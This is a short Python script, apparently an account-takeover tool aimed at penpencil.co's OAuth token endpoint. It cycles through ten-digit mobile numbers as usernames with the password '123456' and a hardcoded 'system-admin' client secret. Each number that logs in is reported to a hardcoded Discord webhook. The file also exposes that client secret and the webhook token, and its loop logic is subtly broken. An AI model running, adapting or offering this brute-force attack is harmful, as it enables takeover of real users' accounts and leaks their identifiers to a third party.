import requests
import re
def sendiscord(numbr):
    print(numbr)
    whurl="https://discord.com/api/webhooks/1068549418342694972/qhzsNPpF9dxBewVebykPzrdDcqekgs4w0z2y083dFOdr-Fmin5wASIxLUYnJjCEMECe3"
    msg={"content": numbr }
    requests.post(whurl,headers={"content-type":"application/json"},json = msg)

headers = {
    'Authorization': 'Bearer',
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/plain, */*',
    'client-id': '5eb393ee95fab7468a79d189',
}
json_data = {
    'password': '123456',
    'client_id': 'system-admin',
    'client_secret': 'KjPXuAVfC5xbmgreETNMaL7z',
    'grant_type': 'password',
    'organizationId': '5eb393ee95fab7468a79d189',
    'latitude': 0,
    'longitude': 0,
}
pattern = "^(?!.*([0]{6}|[1]{6}|[2]{6}|[3]{6}|[4]{6}|[5]{6}|[6]{6}|[7]{6}|[8]{6}|[9]{6}).*)([7-9][0-9]{9})$"
number = 9999999999
while number!="9000000000":
    b=bool(re.match(pattern,str(number)))
    number-=1
    if b:
        json_data['username']=number
        response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
        if (response.json())['success']:
            sendiscord(str(number))
